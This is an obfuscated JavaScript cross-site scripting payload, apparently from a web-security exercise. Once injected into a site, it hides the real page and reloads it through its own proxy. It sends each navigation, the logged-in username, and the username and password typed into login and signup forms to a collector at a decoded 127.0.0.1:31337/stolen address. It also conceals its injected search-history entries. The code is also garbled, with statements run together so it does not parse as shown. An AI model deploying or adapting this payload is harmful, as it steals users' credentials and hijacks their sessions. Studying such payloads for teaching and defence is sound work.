function payload(attacker) {
    function log(attacker, data) {
        console.log($.param(data)) $.get(attacker, data)
    }

    function proxy(attacker, href, ifPushState) {
        $(String.fromCharCode(104, 116, 109, 108)).load(href, function() {
            var user = $(String.fromCharCode(35, 108, 111, 103, 103, 101, 100, 45, 105, 110, 45, 117, 115, 101, 114)) var username = user.text() $(String.fromCharCode(104, 116, 109, 108)).show() if (username == String.fromCharCode()) {
                    log(attacker, {
                        event: String.fromCharCode(110, 97, 118),
                        uri: href
                    })
                } else {
                    log(attacker, {
                        event: String.fromCharCode(110, 97, 118),
                        user: username,
                        uri: href
                    })
                }
            filterSearch() handleClick() if (ifPushState) {
                history.pushState(href, document.title, href)
            }
        })
    }

    function handleClick() {
        $(String.fromCharCode(35, 115, 101, 97, 114, 99, 104, 45, 98, 116, 110)).click(onSearch) $(String.fromCharCode(35, 115, 101, 97, 114, 99, 104, 45, 97, 103, 97, 105, 110, 45, 98, 116, 110)).click(onSearchAgain) $(String.fromCharCode(35, 108, 111, 103, 45, 105, 110, 45, 98, 116, 110)).click(onLogin) $(String.fromCharCode(35, 110, 101, 119, 45, 97, 99, 99, 111, 117, 110, 116, 45, 98, 116, 110)).click(onCreate) $(String.fromCharCode(35, 108, 111, 103, 45, 111, 117, 116, 45, 98, 116, 110)).click(onLogout)
    }

    function filterSearch() {
        var historyList = $(String.fromCharCode(35, 104, 105, 115, 116, 111, 114, 121, 45, 108, 105, 115, 116, 32, 97)) var injectedCode = payload.toString().split(String.fromCharCode(92, 110)) if (historyList.length == 0) {
                return
            }
        for (var i = 0 i < historyList.length i++) {
            if (historyList[i].text.indexOf(injectedCode[0]) != -1) {
                historyList[i].style.display = String.fromCharCode(110, 111, 110, 101)
            }
        }
    }

    function onSearch(event) {
        var query = $(String.fromCharCode(35, 113, 117, 101, 114, 121)).val() var url = String.fromCharCode(46, 47, 115, 101, 97, 114, 99, 104, 63, 113, 61) + query proxy(attacker, url, true) event.preventDefault()
    }

    function onSearchAgain(event) {
        proxy(attacker, String.fromCharCode(46, 47), true) event.preventDefault()
    }

    function onLogin(event) {
        loginHelper(String.fromCharCode(46, 47, 108, 111, 103, 105, 110)) event.preventDefault()
    }

    function onCreate(event) {
        loginHelper(String.fromCharCode(46, 47, 99, 114, 101, 97, 116, 101)) event.preventDefault()
    }

    function loginHelper(action) {
        var username = $(String.fromCharCode(35, 117, 115, 101, 114, 110, 97, 109, 101)).val() var password = $(String.fromCharCode(35, 117, 115, 101, 114, 112, 97, 115, 115)).val() var data = {
            String.fromCharCode(117, 115, 101, 114, 110, 97, 109, 101): username,
            String.fromCharCode(112, 97, 115, 115, 119, 111, 114, 100): password
        }
        log(attacker, {
            event: String.fromCharCode(108, 111, 103, 105, 110),
            user: username,
            pass: password
        }) $.post(action, data, function() {
            proxy(attacker, String.fromCharCode(46, 47), true)
        })
    }

    function onLogout(event) {
        var user = $(String.fromCharCode(35, 108, 111, 103, 103, 101, 100, 45, 105, 110, 45, 117, 115, 101, 114)) var username = user.text() log(attacker, {
            event: String.fromCharCode(108, 111, 103, 111, 117, 116),
            user: username
        }) $.post(String.fromCharCode(46, 47, 108, 111, 103, 111, 117, 116), function() {
            proxy(attacker, String.fromCharCode(46, 47), true)
        }) event.preventDefault()
    }

    function bootstrap() {
        var url = String.fromCharCode(46, 47) $(String.fromCharCode(104, 116, 109, 108)).hide() proxy(attacker, url, false) history.replaceState(url, document.title, url)
    }
    window.onpopstate = function(event) {
        proxy(attacker, event.state, false)
    }
    bootstrap()
}
payload(String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 49, 50, 55, 46, 48, 46, 48, 46, 49, 58, 51, 49, 51, 51, 55, 47, 115, 116, 111, 108, 101, 110))